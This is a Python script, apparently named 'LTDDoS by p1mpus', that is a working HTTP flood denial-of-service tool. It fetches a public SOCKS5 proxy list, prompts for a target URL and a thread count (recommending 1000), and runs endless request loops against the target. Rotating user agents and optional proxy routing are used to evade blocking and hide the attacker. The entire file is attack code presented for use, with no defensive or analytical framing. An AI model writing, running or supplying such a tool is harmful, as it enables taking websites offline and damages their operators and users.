import requests
import os
import sys
import ctypes
from random import choice
import threading
import socket

cwd = os.getcwd()
fos = sys.platform

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)

icon = resource_path("1.ico")
ua_txt = resource_path("ua.txt")
proxy_txt = resource_path("proxy.txt")

text = open(ua_txt,'r').readlines()
ua = []
for line in text:
    ua.append(line.split())
    
text_proxy = open(proxy_txt, 'wb')
try:
    r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt")
    text_proxy.write(r.content)
    text_proxy.close()
    text_proxy = open(proxy_txt,'r').readlines()
    proxy = []
    col_proxy = 0
    for line in text_proxy:
        proxy.append(line.split())
        col_proxy += 1
except:
    pass

def VPN():
    print("""
██╗░░░░░████████╗██████╗░██████╗░░█████╗░░██████╗
██║░░░░░╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░░░░░░░██║░░░██║░░██║██║░░██║██║░░██║░╚═══██╗
███████╗░░░██║░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚══════╝░░░╚═╝░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░

#################################################
#                coded by p1mpus                #
#################################################
""")
    
    if (fos == 'linux'):
        response = requests.get('http://icanhazip.com/')
        print(f'Found proxy: {col_proxy}')
        print("Your IP: " + response.text)
        main()
    elif (fos == 'win32'):
        ctypes.windll.kernel32.SetConsoleTitleW('LTDDoS by p1mpus')
        response = requests.get('http://icanhazip.com/')
        print(f'Found proxy: {col_proxy}')
        print("Your IP: " + response.text)
        main()

def main():
    try:
        global url
        print('Example URL: https://google.com')
        url = input("Write site URL: ")
	
        global thr
        thr = input("Write threads (recommended: 1000): ")
        thr = int(thr)

        prx = input('Use proxy? [y/n]: ')
        
        ip_url = url.replace('https://', '').replace('http://', '').replace('/', '')
        ip = socket.gethostbyname(ip_url)
        print(f"\nSite IP: {ip}")
        start = input("Start attack? [y/n]: ")

        if(start == 'y'):
            if(prx == 'y'):  
                print(f'\nAttack GET-Proxy Started to {url}!\n[Press CTRL+C/Z to stop]')
                for i in range(thr):
                    threading.Thread(target=GET_PROXY).start()
            else:
                print(f'\nAttack GET Started to {url}!\n[Press CTRL+C/Z to stop]')
                for i in range(thr):
                    threading.Thread(target=GET).start()
        elif(start == 'n'):
            print('STOP!')
            VPN()
        else:
            print('ERROR!')
            VPN()
    except:
        print('ERROR!')
        VPN()

def GET():
    while True:
        try:
            user_agent = choice(ua)
            user_agent = str(user_agent)
            user_agent = user_agent.replace('[', '').replace(']', '')
            requests.get(url, headers={'User-Agent':user_agent})
        except:
            pass
        
def GET_PROXY():
    while True:
        try:
            user_agent = choice(ua)
            user_agent = str(user_agent)
            user_agent = user_agent.replace('[', '').replace(']', '')
            proxy5 = choice(proxy)
            proxy5 = str(proxy5)
            proxy5 = proxy5.replace('[', '').replace(']', '').replace("'", '')
            prx = f'socks5://{proxy5}'
            requests.get(url, headers={'User-Agent':user_agent}, proxies = {'http':prx})
        except:
            pass
        
VPN()
